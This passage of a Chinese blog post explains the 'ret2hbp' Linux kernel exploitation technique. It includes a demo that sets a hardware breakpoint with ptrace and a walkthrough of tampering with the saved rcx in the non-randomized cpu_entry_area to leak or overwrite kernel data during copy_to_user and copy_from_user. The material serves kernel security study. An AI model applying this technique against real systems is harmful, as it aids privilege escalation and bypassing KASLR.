class="hljs-keyword">define</span>IST_INDEX_NMI1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_DB2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_MCE3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_VC4</span><br></code></pre></td></tr></table></figure><p>在这5种特定中断中，由于在用户模式下利用ptrace设置硬件断点能够激活DEBUG中断，硬件断点的触发不仅可以在用户空间实现，也能在内核空间进行。这使得通过硬件断点引发的中断成为了后期应用中最优选项。</p><p>DEBUG对应的处理函数为<code>asm_exc_debug()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">const</span> __initconst <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">idt_data</span> <span class="hljs-title">def_idts</span>[] =</span> &#123;<br>.........<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>INTG(X86_TRAP_DB,asm_exc_debug),<br>.........<br>&#125;;<br></code></pre></td></tr></table></figure><p>具体实现为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs C">DEFINE_IDTENTRY_DEBUG(exc_debug)<br>&#123;<br>exc_debug_kernel(regs, debug_read_clear_dr6());<br>&#125;<br><br><span class="hljs-comment">/* User entry, runs on regular task stack */</span><br>DEFINE_IDTENTRY_DEBUG_USER(exc_debug)<br>&#123;<br>exc_debug_user(regs, debug_read_clear_dr6());<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-comment">/* 32 bit does not have separate entry points. */</span><br>DEFINE_IDTENTRY_RAW(exc_debug)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> dr6 = debug_read_clear_dr6();<br><br><span class="hljs-keyword">if</span> (user_mode(regs))<br>exc_debug_user(regs, dr6);<br><span class="hljs-keyword">else</span><br>exc_debug_kernel(regs, dr6);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就可以愉快的写个demo啦</p><p>首先便是设置一个已知内存地址的硬件断点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>被<code>ptrace</code>跟踪的子进程可以通过以下两种途径激活硬件断点：当在用户空间触发硬件断点时，将会调用<code>exc_debug_user()</code>函数进行处理；相反，若是在执行类似<code>uname()</code>这样的函数，其中涉及<code>copy_from/to_user()</code>操作时触发硬件断点，则会调用<code>exc_debug_kernel()</code>函数进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C">SYSCALL_DEFINE1(uname, <span class="hljs-keyword">struct</span> old_utsname __user *, name)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">old_utsname</span> <span class="hljs-title">tmp</span>;</span><br><br><span class="hljs-keyword">if</span> (!name)<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>down_read(&amp;uts_sem);<br><span class="hljs-built_in">memcpy</span>(&amp;tmp, utsname(), <span class="hljs-keyword">sizeof</span>(tmp));<br>up_read(&amp;uts_sem);<br><span class="hljs-keyword">if</span> (copy_to_user(name, &amp;tmp, <span class="hljs-keyword">sizeof</span>(tmp)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-keyword">if</span> (override_release(name-&gt;release, <span class="hljs-keyword">sizeof</span>(name-&gt;release)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (override_architecture(name))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>组合一下（👴本来想用内联汇编中的syscall_uname，这样就能很清楚的看寄存器的值，结果发现这样好像断不住呜呜）</p><p>PS：由于<code>cpu_entry_area</code>是per-cpu的，所以要绑个CPU，调试的时候换绑不同的CPU发现DEBUG Exception stack完全不同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><br><span class="hljs-type">char</span> data[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">pid_t</span> pid_hbp;<br><br>    bind_cpu(<span class="hljs-number">0</span>);<br>    <br>    pid_hbp = fork();<br>    <span class="hljs-keyword">if</span> (!pid_hbp)<br>    &#123;<br>        ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        raise(SIGSTOP);<br>        <span class="hljs-comment">// __asm__(</span><br>        <span class="hljs-comment">// &quot;mov r15,   0x11111111;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r14,   0x22222222;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r13,   0x33333333;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r12,   0x44444444;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rbp,   0x55555555;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rbx,   0x66666666;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r11,   0x77777777;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r10,   0x88888888;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r9,    0x99999999;&quot;   </span><br>        <span class="hljs-comment">// &quot;mov r8,    0xaaaaaaaa;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rax,   0xbbbbbbbb;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rcx,   0xcccccccc;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rdx,   0xdddddddd;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rsi,   data;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rdi,   [rsi];&quot;</span><br>        <span class="hljs-comment">// // &quot;mov qword ptr [rdi], 1;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rax,   63;&quot;</span><br>        <span class="hljs-comment">// &quot;syscall;&quot;</span><br>        <span class="hljs-comment">// );</span><br>        uname((<span class="hljs-type">void</span> *)data);<br>        <br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    waitpid(pid_hbp,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    create_hbp(pid_hbp, data);<br><br>    ptrace(PTRACE_CONT,pid_hbp,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);            <br>    waitpid(pid_hbp,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>打个断点在<code>exc_debug_kernel</code>上（👴不知道为什么👴不能用<code>b exc_debug_kernel</code>直接break，只能用源码+line才能break）</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202125518.png" style="zoom:50%;" /><p>运行demo，观看寄存器发现确实<code>ip</code>断在copy_to_user中，在这个上下文中，<code>di</code>寄存器作为目标用户空间地址，而<code>si</code>寄存器则代表源自内核空间的地址，数据从<code>si</code>拷贝至<code>di</code>。拷贝操作以每次8字节的方式逐步执行，<code>cx</code>寄存器记录了剩余需要拷贝的次数。值得注意的是，在硬件断点触发时，<code>rep movs</code>指令已经执行了一轮拷贝，即已经处理了8字节的数据。</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202130307.png" style="zoom:50%;" /><p>而这个regs参数，正处于<code>struct cpu_entry_area</code>中的 <code>DEBUG Exception stack</code>中：</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202130731.png" style="zoom:50%;" /><p>因此，<code>regs.cx</code>在未知内核地址空间布局随机化（KASLR）的情况下，成为了一个极佳的攻击目标。</p><p>进一步探讨<code>uname</code>函数调用的情况，我们发现<code>copy_to_user</code>函数操作的数据源自一个位于内核栈上的临时对象：</p><p>在<code>copy_to_user</code>操作进行时，如果另一个进程通过任意地址写在被攻击（victim）进程的硬件断点中断处理期间更改了<code>regs.cx</code>的值，当中断处理结束，执行流重新进入<code>copy_to_user</code>时，由于<code>cx</code>寄存器的值已被篡改，将会导致向用户态缓冲区拷贝额外的内容。这便有了leak dirty data的机会惹。</p><p>相同的，既然在copy_to_user的时候可以hack rcx，那么在copy_from_user的时候同样也可以，增加复制长度，将构造好的数据出传入进去。p0 blog里就选用了一个prctl的子函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">prctl_set_mm_map</span><span class="hljs-params">(<span class="hljs-type">int</span> opt, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> data_size)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">prctl_mm_map</span> <span class="hljs-title">prctl_map</span> =</span> &#123; .exe_fd = (u32)<span class="hljs-number">-1</span>, &#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_auxv[AT_VECTOR_SIZE];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br><span class="hljs-type">int</span> error;<br><br>BUILD_BUG_ON(<span class="hljs-keyword">sizeof</span>(user_auxv) != <span class="hljs-keyword">sizeof</span>(mm-&gt;saved_auxv));<br>BUILD_BUG_ON(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> prctl_mm_map) &gt; <span class="hljs-number">256</span>);<br><br><span class="hljs-keyword">if</span> (opt == PR_SET_MM_MAP_SIZE)<br><span class="hljs-keyword">return</span> put_user((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-keyword">sizeof</span>(prctl_map),<br>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __user *)addr);<br><br><span class="hljs-keyword">if</span> (data_size != <span class="hljs-keyword">sizeof</span>(prctl_map))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">if</span> (copy_from_user(&amp;prctl_map, addr, <span class="hljs-keyword">sizeof</span>(prctl_map)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>error = validate_prctl_map_addr(&amp;prctl_map);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">return</span> error;<br><br><span class="hljs-keyword">if</span> (prctl_map.auxv_size) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Someone is trying to cheat the auxv vector.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!prctl_map.auxv ||<br>prctl_map.auxv_size &gt; <span class="hljs-keyword">sizeof</span>(mm-&gt;saved_auxv))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-built_in">memset</span>(user_auxv, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(user_auxv));<br><span class="hljs-keyword">if</span> (copy_from_user(user_auxv,<br>   (<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *)prctl_map.auxv,<br>   prctl_map.auxv_size))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-comment">/* Last entry must be AT_NULL as specification requires */</span><br>user_auxv[AT_VECTOR_SIZE - <span class="hljs-number">2</span>] = AT_NULL;<br>user_auxv[AT_VECTOR_SIZE - <span class="hljs-number">1</span>] = AT_NULL;<br>&#125;<br><br><span class="hljs-keyword">if</span> (prctl_map.exe_fd != (u32)<span class="hljs-number">-1</span>) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Check if the current user is checkpoint/restore capable.</span><br><span class="hljs-comment"> * At the time of this writing, it checks for CAP_SYS_ADMIN</span><br><span class="hljs-comment"> * or CAP_CHECKPOINT_RESTORE.</span><br><span class="hljs-comment"> * Note that a user with access to ptrace can masquerade an</span><br><span class="hljs-comment"> * arbitrary program as any executable, even setuid ones.</span><br><span class="hljs-comment"> * This may have implications in the tomoyo subsystem.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!checkpoint_restore_ns_capable(current_user_ns()))<br><span class="hljs-keyword">return</span> -EPERM;<br><br>error = prctl_set_mm_exe_file(mm, prctl_map.exe_fd);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">return</span> error;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * arg_lock protects concurent updates but we still need mmap_lock for</span><br><span class="hljs-comment"> * read to exclude races with sys_brk.</span><br><span class="hljs-comment"> */</span><br>mmap_read_lock(mm);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We don&#x27;t validate if these members are pointing to</span><br><span class="hljs-comment"> * real present VMAs because application may have correspond</span><br><span class="hljs-comment"> * VMAs already unmapped and kernel uses these members for statistics</span><br><span class="hljs-comment"> * output in procfs mostly, except</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *  - @start_brk/@brk which are used in do_brk_flags but kernel lookups</span><br><span class="hljs-comment"> *    for VMAs when updating these memvers so anything wrong written</span><br><span class="hljs-comment"> *    here cause kernel to swear at userspace program but won&#x27;t lead</span><br><span class="hljs-comment"> *    to any problem in kernel itself</span><br><span class="hljs-comment"> */</span><br><br>spin_lock(&amp;mm-&gt;arg_lock);<br>mm-&gt;start_code= prctl_map.start_code;<br>mm-&gt;end_code= prctl_map.end_code;<br>mm-&gt;start_data= prctl_map.start_data;<br>mm-&gt;end_data= prctl_map.end_data;<br>mm-&gt;start_brk= prctl_map.start_brk;<br>mm-&gt;brk= prctl_map.brk;<br>mm-&gt;start_stack= prctl_map.start_stack;<br>mm-&gt;arg_start= prctl_map.arg_start;<br>mm-&gt;arg_end= prctl_map.arg_end;<br>mm-&gt;env_start= prctl_map.env_start;<br>mm-&gt;env_end= prctl_map.env_end;<br>spin_unlock(&amp;mm-&gt;arg_lock);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Note this update of @saved_auxv is lockless thus</span><br><span class="hljs-comment"> * if someone reads this member in procfs while we&#x27;re</span><br><span class="hljs-comment"> * updating -- it may get partly updated results. It&#x27;s</span><br><span class="hljs-comment"> * known and acceptable trade off: we leave it as is to</span><br><span class="hljs-comment"> * not introduce additional locks here making the kernel</span><br><span class="hljs-comment"> * more complex.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (prctl_map.auxv_size)<br><span class="hljs-built_in">memcpy</span>(mm-&gt;saved_auxv, user_auxv, <span class="hljs-keyword">sizeof</span>(user_auxv));<br><br>mmap_read_unlock(mm);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="HOWEVER"><a href="#HOWEVER" class="headerlink" title="HOWEVER"></a>HOWEVER</h2><p><code>ret2hbp</code>之所以能够利用，是由于<code>cpu_entry_area</code>这块2T的内存并没有被随机化</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">========================================================================================================================<br>    Start addr    |<span class="hljs-string">   Offset   </span>|<span class="hljs-string">     End addr     </span>|<span class="hljs-string">  Size   </span>|<span class="hljs-string"> VM area description</span><br><span class="hljs-string">========================================================================================================================</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000000000000000 |<span class="hljs-string">    0       </span>|<span class="hljs-string"> 00007fffffffffff </span>|<span class="hljs-string">  128 TB </span>|<span class="hljs-string"> user-space virtual memory, different per mm</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000800000000000 |<span class="hljs-string"> +128    TB </span>|<span class="hljs-string"> ffff7fffffffffff </span>|<span class="hljs-string"> ~16M TB </span>|<span class="hljs-string"> ... huge, almost 64 bits wide hole of non-canonical</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     virtual memory addresses up to the -128 TB</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     starting offset of kernel mappings.</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Kernel-space virtual memory, shared between all processes:</span><br><span class="hljs-string">____________________________________________________________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffff800000000000 |<span class="hljs-string"> -128    TB </span>|<span class="hljs-string"> ffff87ffffffffff </span>|<span class="hljs-string">    8 TB </span>|<span class="hljs-string"> ... guard hole, also reserved for hypervisor</span><br><span class="hljs-string"> ffff880000000000 </span>|<span class="hljs-string"> -120    TB </span>|<span class="hljs-string"> ffff887fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> LDT remap for PTI</span><br><span class="hljs-string"> ffff888000000000 </span>|<span class="hljs-string"> -119.5  TB </span>|<span class="hljs-string"> ffffc87fffffffff </span>|<span class="hljs-string">   64 TB </span>|<span class="hljs-string"> direct mapping of all physical memory (page_offset_base)</span><br><span class="hljs-string"> ffffc88000000000 </span>|<span class="hljs-string">  -55.5  TB </span>|<span 